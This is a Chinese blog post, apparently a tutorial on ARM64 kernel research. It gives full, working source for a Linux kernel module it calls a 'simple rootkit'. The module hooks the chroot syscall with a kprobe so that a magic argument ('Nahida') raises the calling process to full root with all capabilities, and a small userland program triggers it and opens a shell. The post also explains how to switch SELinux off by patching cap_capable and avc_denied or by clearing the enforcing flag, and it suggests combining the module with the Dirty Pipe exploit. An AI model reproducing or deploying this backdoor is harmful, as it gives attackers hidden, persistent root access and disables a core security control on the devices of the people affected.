> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xtuly.cn](https://xtuly.cn/article/arm64-kernel-research-2)

> 一个简单的 kernel root 模块，配合 dirty pipe 提权食用更香

一个简单的 kernel root 模块，配合 dirty pipe 提权食用更香

[](#dabb781ce2a54327a5ac30b3bfba13d6 "相关内核基础")相关内核基础
----------------------------------------------------

### [](#c2238648a0af464f87874471cc7cc82c "task_struct 结构体")task_struct 结构体

```
struct task_struct {
	......
	

	
	const struct cred __rcu		*ptracer_cred;

	
	const struct cred __rcu		*real_cred;

	
	const struct cred __rcu		*cred;
	......
}

```

### [](#ab4ed374de5446d9a04bb9a3da370461 "cred 结构体")cred 结构体

```
struct cred {
	......
	kuid_t		uid;		
	kgid_t		gid;		
	kuid_t		suid;		
	kgid_t		sgid;		
	kuid_t		euid;		
	kgid_t		egid;		
	kuid_t		fsuid;		
	kgid_t		fsgid;		
	unsigned	securebits;	
	kernel_cap_t	cap_inheritable; 
	kernel_cap_t	cap_permitted;	
	kernel_cap_t	cap_effective;	
	kernel_cap_t	cap_bset;	
	kernel_cap_t	cap_ambient;	
	......
} __randomize_layout;

```

<table><tbody><tr><td><p>字段</p></td><td><p>解释</p></td></tr><tr><td><p>uid/gid</p></td><td><p>实际用户 / 组 id，取决于登陆的是哪个用户</p></td></tr><tr><td><p>suid/sgid</p></td><td><p>保存的用户 / 组 uid，针对文件而言</p></td></tr><tr><td><p>euid/egid</p></td><td><p>有效的用户 / 组 id，判断进程对某文件是否有权限用的是这个</p></td></tr><tr><td><p>cap_inheritable</p></td><td><p>子进程可以继承的权限</p></td></tr><tr><td><p>cap_permitted</p></td><td><p>进程能够使用的权限</p></td></tr><tr><td><p>cap_effective</p></td><td><p>进程实际使用的权限</p></td></tr></tbody></table>

[](#52377beb9fa74caf8c1620637f7223d7 "让我们开始吧")让我们开始吧
----------------------------------------------------

### [](#e3a5ede301c84b1f9fa79c1518b593c3 "如何将一个进程提权成root")如何将一个进程提权成 root

1.  *id 置 0

2.  cap_* 所有 bit 置 1

```
static inline void set_cred_root(struct cred* cred){
	cred->uid = cred->suid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
	cred->gid = cred->sgid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
	memset(&cred->cap_inheritable, 0xFF, sizeof(kernel_cap_t));
	memset(&cred->cap_permitted, 0xFF, sizeof(kernel_cap_t));
	memset(&cred->cap_effective, 0xFF, sizeof(kernel_cap_t));
}

static inline int set_process_root(int pid) {
  int ret = 0;
	struct task_struct* task = NULL;
	struct cred* real_cred = NULL;
	struct cred* cred = NULL;
	struct pid* proc_pid_struct = NULL;
	proc_pid_struct = find_get_pid(pid);
	if (!proc_pid_struct) {
		ret = -ESRCH;
		goto out;
	}
	task = get_pid_task(proc_pid_struct, PIDTYPE_PID);
	if (!task) { 
		ret = -ESRCH;
		goto out_pid;
	}
	real_cred = (struct cred*)task->real_cred;
	if (real_cred) {
		set_cred_root(real_cred);
	}
	cred = (struct cred*)task->cred;
	if (cred) {
		set_cred_root(cred);
	}
	put_task_struct(task);
out_pid:
  put_pid(proc_pid_struct);
out:
	return ret;
}

```

### [](#7600b6a01c694c499bb947701d46e597 "如何触发后门")如何触发后门

这方法就多种多样了，比如：

1.  在 proc 目录下生成一个 666 的文件，对其写入指定内容后提权到 root

2.  给进程发送某指定信号

3.  修改某指定系统调用，传入某指定参数后触发

> 建议：使用冷门系统调用减少对性能的影响

等等等等，都可以触发，看哪个更适合自己就行。

### [](#29137223c98749958083ed2b77cfdcb1 "代码时间到")代码时间到

本例子触发方式：

chroot(”Nahida”)

#### [](#d2641cebcdd8459f80efefb85b355cc7 "内核模块")内核模块

```
#include "linux/uidgid.h"
#include <linux/cpu.h>
#include <linux/memory.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <asm-generic/errno-base.h>

#ifdef pr_fmt
#undef pr_fmt
#define pr_fmt(fmt) "Rootkit: " fmt
#endif

static inline void set_cred_root(struct cred* cred){
	cred->uid = cred->suid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
	cred->gid = cred->sgid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
	memset(&cred->cap_inheritable, 0xFF, sizeof(kernel_cap_t));
	memset(&cred->cap_permitted, 0xFF, sizeof(kernel_cap_t));
	memset(&cred->cap_effective, 0xFF, sizeof(kernel_cap_t));
}

static inline int set_process_root(int pid) {
	int ret = 0;
	struct task_struct* task = NULL;
	struct cred* real_cred = NULL;
	struct cred* cred = NULL;
	struct pid* proc_pid_struct = NULL;
	proc_pid_struct = find_get_pid(pid);
	if (!proc_pid_struct) {
		ret = -ESRCH;
		goto out;
	}
	task = get_pid_task(proc_pid_struct, PIDTYPE_PID);
	if (!task) { 
		ret = -ESRCH;
		goto out_pid;
	}
	real_cred = (struct cred*)task->real_cred;
	if (real_cred) {
		set_cred_root(real_cred);
	}
	cred = (struct cred*)task->cred;
	if (cred) {
		set_cred_root(cred);
	}
	put_task_struct(task);
out_pid:
	put_pid(proc_pid_struct);
out:
	return ret;
}



static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags) {
}

static int handler_fault(struct kprobe *p, struct pt_regs *regs, int trapnr) {
    return 0;
}

struct Param {
    const char __user *filename;
};

static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
	char buf[8];
    struct Param param = *(struct Param *)regs->regs[0];
    copy_from_user(buf, param.filename, 8);
	buf[6] = 0;
	pr_emerg("chroot: %s", buf);
	if (strcmp(buf, "Nahida") == 0) {
		pr_emerg("root!");
		set_process_root(current->pid);
	}
    return 0;
}

static struct kprobe kp = {
    .symbol_name = "__arm64_sys_chroot",
    .pre_handler = handler_pre,
    .post_handler = handler_post,
    .fault_handler = handler_fault
};

int rootkit_init(void){
	int ret = register_kprobe(&kp);
	pr_emerg("load: %d", ret);
	return ret;
}

void rootkit_exit(void){
	unregister_kprobe(&kp);
	pr_emerg("unload");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ylarod");
MODULE_DESCRIPTION("A simple rootkit");

```

#### [](#58162142ec80410a9cdc5b54d7746a92 "用户层")用户层

```
#include <unistd.h>
#include <stdlib.h>

int main(){
    chroot("Nahida");
    system("/system/bin/sh");
    return 0;
}

```

### [](#1d9b278b600a47e09df42db4bf54fcbf "测试一下吧")测试一下吧

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/e3406d1d-0410-4b23-be43-e77d15b5b307/%E6%88%AA%E5%B1%8F2022-11-28_16.46.09.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221128%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221128T150228Z&X-Amz-Expires=86400&X-Amz-Signature=9a016f2ddbecb3fed0a145ca7b64a686ed16e969b480f5c66c049f4e71f22d32&X-Amz-SignedHeaders=host&x-id=GetObject)

可以看到，uid，gid，groups 已经变成 root 了，但是 selinux context 还没有变，怎么解决 selinux context 的问题呢？

> 命令行 chroot 不行的原因： 他是先 chdir xxx 然后 chroot .

### [](#c9e35e1bb8d147a2ad837315265b2eae "解决SELINUX")解决 SELINUX

#### [](#97f4cdddcb5c4d798ce3812daee436b2 "方法一：简单粗暴法")方法一：简单粗暴法

修改两处

1.  security/commoncap.c - **cap_capable**

2.  security/selinux/avc.c - **avc_denied**

在函数最前面添加下面代码

```
if(current->real_cred->uid.val == 0){
	return 0;
}

```

即可让 selinux 对 root 进程失效

使用内核模块的话可以用 kretprobe 修改上述两个函数的返回值

#### [](#1e0c2eb2f1804ddeadd945af698094c9 "方法二：修改context")方法二：修改 context

#### [](#f38bf2b3ba4b482f938c627fc60088ba "方法三：摆烂permissive")方法三：摆烂 permissive

将 `selinux_state->enforcing` 赋值为 0

```
void set_permissive(){
	int* selinux_enforcing = kprobe_get_addr("selinux_state"); 
	*selinux_enforcing = 0;
}

```

kprobe_get_addr 可以在[上一篇文章](https://xtuly.cn/article/arm64-kernel-research-1#a9406fdd1d0944dd9e143310997b4c54)中找到

### [](#b8ebc1cd055b4218be725182f4dd8b3e "继续测试吧")继续测试吧

这里使用摆烂大法

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/abd90c08-68e3-4811-8b09-5623e15900b7/%E6%88%AA%E5%B1%8F2022-11-28_17.12.06.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20221128%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20221128T150228Z&X-Amz-Expires=86400&X-Amz-Signature=ef3161e22671706c14fd10ae26d51fc7a1b35c39cc26bf7010fc711d67f06fc5&X-Amz-SignedHeaders=host&x-id=GetObject)